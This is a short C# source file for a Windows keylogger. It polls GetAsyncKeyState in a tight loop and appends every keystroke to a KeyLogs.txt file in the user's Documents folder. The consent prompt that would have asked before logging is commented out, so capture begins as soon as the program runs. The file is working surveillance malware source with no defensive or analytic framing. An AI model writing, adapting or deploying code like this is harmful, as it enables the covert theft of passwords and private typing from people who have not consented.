using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.IO;

namespace Keylogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            /*Console.WriteLine("Start keylogging? Y/N");
            string start = Console.ReadLine();
            if (start.Equals("Y"))
            {*/
            Console.WriteLine(">>Keylogger<<");
            Console.WriteLine("");
                Start();
           /* }
            else
            {
                Console.WriteLine("Exiting...");
                Application.Exit();
            }*/
        }
        static void Start()
        {
            while (true)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == -32767)
                    {
                        //Console.WriteLine(keyState);
                        Console.WriteLine((Keys)i);
                        string toStringKeys = Convert.ToString((Keys)i);
                        File.AppendAllText("C:\\Users\\" + Environment.UserName + "\\Documents\\KeyLogs.txt", Environment.NewLine + toStringKeys);
                        break;
                    }
                }
            }
        }
    }
}
